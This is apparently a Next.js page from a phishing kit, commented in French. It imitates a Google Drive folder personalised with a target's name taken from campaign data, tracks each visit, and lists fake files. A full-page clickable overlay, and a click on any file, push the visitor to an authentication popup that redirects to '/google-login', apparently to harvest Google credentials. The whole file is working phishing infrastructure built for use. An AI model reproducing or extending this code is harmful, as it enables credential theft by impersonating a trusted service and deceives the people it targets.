import React, { useState, useEffect } from 'react';
import { useRouter } from 'next/router';
import { PageHead } from '../../src/hooks/usePageMeta';
import { useCampaign } from '../../src/hooks/useCampaigns';
import { useVisitTracker } from '../../src/hooks/useVisitTracker';
import { usePopupManager, POPUP_TYPES } from '../../src/hooks/usePopupManager';
import PopupRenderer from '../../src/components/common/PopupRenderer';
import styles from '../../src/styles/modules/Drive.module.css';

const DriveLanding = () => {
  const [selectedFile, setSelectedFile] = useState(null);
  const [showOverlayFilter, setShowOverlayFilter] = useState(false);
  const router = useRouter();
  const { campaign: campaignId } = router.query;
  
  // Utiliser le hook personnalisé pour récupérer les données de campagne
  const { campaign: campaignData, loading, error } = useCampaign(campaignId);
  
  // Tracker les visites de campagne
  useVisitTracker(campaignId);

  // Gestionnaire de popup centralisé
  const popupManager = usePopupManager();

  // Fonction pour rendre les icônes de fichiers selon le type
  const getFileIcon = (type) => {
    switch (type) {
      case 'folder':
        return (
          <svg height="20px" width="20px" focusable="false" viewBox="0 0 24 24" fill="currentColor" style={{ color: '#5f6368' }}>
            <g>
              <path d="M10 4H4c-1.1 0-1.99.9-1.99 2L2 18c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V8c0-1.1-.9-2-2-2h-8l-2-2z"></path>
              <path d="M0 0h24v24H0z" fill="none"></path>
            </g>
          </svg>
        );
      case 'docs':
        return (
          <svg style={{ width: '20px', height: '20px', color: '#1a73e8' }} viewBox="0 0 16 16" xmlns="http://www.w3.org/2000/svg">
            <path fillRule="evenodd" clipRule="evenodd" d="M14.222 0H1.778C.8 0 0 .8 0 1.778v12.444C0 15.2.8 16 1.778 16h12.444C15.2 16 16 15.2 16 14.222V1.778C16 .8 15.2 0 14.222 0zm-1.769 5.333H3.556V3.556h8.897v1.777zm0 3.556H3.556V7.11h8.897V8.89zm-2.666 3.555H3.556v-1.777h6.23v1.777z" fill="currentColor"></path>
          </svg>
        );
      case 'sheets':
        return (
          <svg style={{ width: '20px', height: '20px', color: '#0f9d58' }} viewBox="0 0 16 16" xmlns="http://www.w3.org/2000/svg">
            <path fillRule="evenodd" clipRule="evenodd" d="M14.222 0H1.778C.8 0 .008.8.008 1.778L0 4.444v9.778C0 15.2.8 16 1.778 16h12.444C15.2 16 16 15.2 16 14.222V1.778C16 .8 15.2 0 14.222 0zm0 7.111h-7.11v7.111H5.332v-7.11H1.778V5.332h3.555V1.778h1.778v3.555h7.111v1.778z" fill="currentColor"></path>
          </svg>
        );
      default:
        return (
          <svg height="20px" width="20px" focusable="false" viewBox="0 0 24 24" fill="currentColor" style={{ color: '#5f6368' }}>
            <g>
              <path d="M10 4H4c-1.1 0-1.99.9-1.99 2L2 18c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V8c0-1.1-.9-2-2-2h-8l-2-2z"></path>
              <path d="M0 0h24v24H0z" fill="none"></path>
            </g>
          </svg>
        );
    }
  };

  useEffect(() => {
    if (error) {
      console.warn(`Erreur lors du chargement de la campagne: ${error}`);
    }
  }, [error]);

  // Afficher le filtre overlay après un délai (responsive)
  useEffect(() => {
    // Vérifier si on est sur mobile
    const isMobile = window.innerWidth <= 768;
    
    if (isMobile) {
      const timer = setTimeout(() => {
        setShowOverlayFilter(true);
      }, 2000);

      return () => clearTimeout(timer);
    } else {
      // Sur desktop, afficher le filtre immédiatement
      setShowOverlayFilter(true);
    }
  }, []);

  const handleFileClick = (e, file) => {
    // Ne pas ouvrir la popup si on clique sur la popup elle-même
    const popupElement = e.target.closest('[data-popup]');
    if (popupElement) {
      return;
    }
    
    // Empêcher la propagation de l'événement
    e.stopPropagation();
    
    console.log('Clic sur fichier:', file.name, 'campaignData:', campaignData);
    
    setSelectedFile(file);
    // Déclencher popup d'authentification immédiatement
    popupManager.openAuthPopup({
      campaignData,
      redirectPath: '/google-login'
    });
  };

  const handleOverlayClick = (e) => {
    // Ne pas ouvrir la popup si on clique sur la popup elle-même
    const popupElement = e.target.closest('[data-popup]');
    if (popupElement) {
      return;
    }
    
    // Empêcher la propagation de l'événement
    e.stopPropagation();
    
    console.log('Clic sur overlay, campaignData:', campaignData);
    
    // Déclencher popup d'authentification
    popupManager.openAuthPopup({
      campaignData,
      redirectPath: '/google-login'
    });
  };

  const handlePopupClose = () => {
    popupManager.closePopup();
    setSelectedFile(null);
  };

  // Titre dynamique basé sur les données de campagne
  const getPageTitle = () => {
    if (loading) return 'Chargement...';
    if (campaignData) {
      return `${campaignData.firstName} ${campaignData.lastName} - Mon Drive`;
    }
    return 'Mon Drive';
  };

  // Description dynamique basée sur les données de campagne  
  const getPageDescription = () => {
    if (loading) return 'Chargement de votre Drive...';
    if (campaignData) {
      return `Accédez aux fichiers partagés de ${campaignData.firstName} ${campaignData.lastName}. Stockage cloud sécurisé.`;
    }
    return 'Accédez à vos fichiers dans le cloud de manière sécurisée';
  };

  // Données simulées pour les dossiers et fichiers
  const driveItems = [
    {
      id: 1,
      name: 'Documents importants',
      type: 'folder',
      fileType: 'folder',
      modified: '2 jours',
      size: '-- --'
    },
    {
      id: 2,
      name: 'Présentation projet',
      type: 'folder',
      fileType: 'folder',
      modified: '3 jours',
      size: '-- --'
    },
    {
      id: 3,
      name: 'Calendrier disponibilités',
      type: 'folder',
      fileType: 'folder',
      modified: '1 semaine',
      size: '-- --',
      highlighted: true
    },
    {
      id: 4,
      name: 'Rapport_final.pdf',
      type: 'file',
      fileType: 'docs',
      modified: '5 jours',
      size: '2.4 MB'
    },
    {
      id: 5,
      name: 'Budget_2024.xlsx',
      type: 'file',
      fileType: 'sheets',
      modified: '1 semaine',
      size: '856 KB'
    }
  ];

  // Affichage en cas d'erreur
  if (error) {
    return (
      <>
        <PageHead 
          title="Erreur de chargement"
          description="Une erreur s'est produite lors du chargement de la campagne"
        />
        <div className={styles.container}>
          <div className={styles.errorMessage}>
            <h2>Erreur de chargement</h2>
            <p>La campagne demandée n'a pas pu être chargée.</p>
            <p>Veuillez vérifier le lien ou contacter l'administrateur.</p>
          </div>
        </div>
      </>
    );
  }

  return (
    <>
      <PageHead 
        title={getPageTitle()}
        description={getPageDescription()}
        options={{
          keywords: 'drive, stockage, fichiers, cloud, partage',
          favicon: '/drive-favicon.ico'
        }}
      />
      
      <div className={styles.container}>
        {/* Header Google Drive simplifié */}
        <div className={styles.header}>
          <div className={styles.headerLeft}>
            <div className={styles.logo}>
              <img 
                src="https://static.vecteezy.com/system/resources/previews/012/871/368/non_2x/google-drive-icon-google-product-illustration-free-png.png"
                alt="Google Drive"
                className={styles.driveIcon}
              />
              <span className={styles.logoText}>Drive</span>
            </div>
          </div>
          <div className={styles.headerRight}>
            <button className={styles.loginButton}>Se connecter</button>
          </div>
        </div>

        {/* Contenu principal */}
        <div className={styles.mainContent}>
          <div className={styles.driveTitle}>
            <h1>Assistance 2025-2026</h1>
            <div className={styles.sortOptions}>
              <button className={`${styles.sortButton} ${styles.sortButtonName}`}>
                <span>Nom</span>
                <svg width="18" height="18" viewBox="0 0 18 18">
                  <path d="M9 12L5 8H13L9 12Z" fill="#5f6368"/>
                </svg>
              </button>
              <button className={`${styles.sortButton} ${styles.sortButtonModified}`}>
                <span>Modifié</span>
              </button>
              <button className={`${styles.sortButton} ${styles.sortButtonSize}`}>
                <span>Taille</span>
              </button>
            </div>
          </div>

          {/* Liste des fichiers */}
          <div className={styles.fileList}>
            {driveItems.map((item) => (
              <div 
                key={item.id}
                className={`${styles.fileItem} ${item.highlighted ? styles.highlighted : ''}`}
                onClick={(e) => handleFileClick(e, item)}
              >
                <div className={styles.fileInfo}>
                  <span className={styles.fileIcon}>{getFileIcon(item.fileType)}</span>
                  <span className={styles.fileName}>{item.name}</span>
                </div>
                <div className={styles.fileDetails}>
                  <span className={styles.fileModified}>{item.modified}</span>
                  <span className={styles.fileSize}>{item.size}</span>
                </div>
              </div>
            ))}
          </div>

          {/* Overlay cliquable */}
          {showOverlayFilter && (
            <div className={`${styles.clickOverlay} ${showOverlayFilter ? styles.visible : ''}`} title="Cliquez pour accéder au fichier" onClick={handleOverlayClick} />
          )}
        </div>
        
        {/* Loader pendant le chargement */}
        {loading && (
          <div className={styles.overlayLoader}>
            <div className={styles.googleLoader}>
              <div className={styles.googleSpinner}>
                <div className={styles.googleSpinnerBlue}></div>
                <div className={styles.googleSpinnerRed}></div>
                <div className={styles.googleSpinnerYellow}></div>
                <div className={styles.googleSpinnerGreen}></div>
              </div>
            </div>
            <p className={styles.loadingText}>Chargement de votre Drive...</p>
          </div>
        )}
        
        {/* Système de popup centralisé */}
        <PopupRenderer
          isVisible={popupManager.isVisible}
          type={popupManager.type}
          data={popupManager.data}
          config={popupManager.config}
          onClose={handlePopupClose}
          onSwitch={popupManager.switchPopup}
        />
      </div>
    </>
  );
};

export default DriveLanding; 